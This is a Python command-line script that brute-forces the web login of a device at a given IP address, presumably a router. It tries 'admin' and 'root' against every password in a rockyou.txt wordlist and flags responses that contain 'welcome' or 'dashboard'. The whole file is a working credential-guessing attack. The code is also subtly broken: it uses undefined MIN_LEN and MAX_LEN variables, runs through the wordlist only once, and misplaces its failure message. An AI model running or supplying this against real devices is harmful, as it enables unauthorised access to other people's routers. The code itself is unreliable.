"""
Explain vulnerability
"""

from argparse import ArgumentParser
from pathlib import Path

from requests import RequestException, post


def check_for_cred(ip: str):
    """
    Tries to brute force credentials
    """
    print("# Brute forcing for credentials...")

    usernames = ["admin", "root"]

    no_hits = True
    password_file = Path(__file__).parent.joinpath("files/rockyou.txt")
    with open(password_file, "r", encoding="utf-8") as password_file:
        for user in usernames:
            for password in password_file:
                password = password.strip()
                print(password)
                try:
                    res = post(
                        f"http://{ip}/login",
                        data={"username": user, "password": password},
                        timeout=5,
                    )
                    if res:
                        # Somtimes routers display "Welcome, Admin". Reason behind welcome
                        if "welcome" in res.text.lower():
                            print(f"- *Credential found!: {user}:{password}*")
                            no_hits = False

                        # Checks for status code 200
                        elif res.status_code == 200 and "dashboard" in res.text.lower():
                            print(f"- *Credential found!: {user}:{password}*")
                            no_hits = False

                except RequestException:
                    continue

                if no_hits:
                    print(
                        f"- No hits when brute forcing credentials with passwords of length {MIN_LEN} to {MAX_LEN}"
                    )
                print()


if __name__ == "__main__":
    parser = ArgumentParser(prog="brute_force_creds")
    parser.add_argument("-ip", action="store", type=str)
    args = parser.parse_args()
    check_for_cred(args.ip)
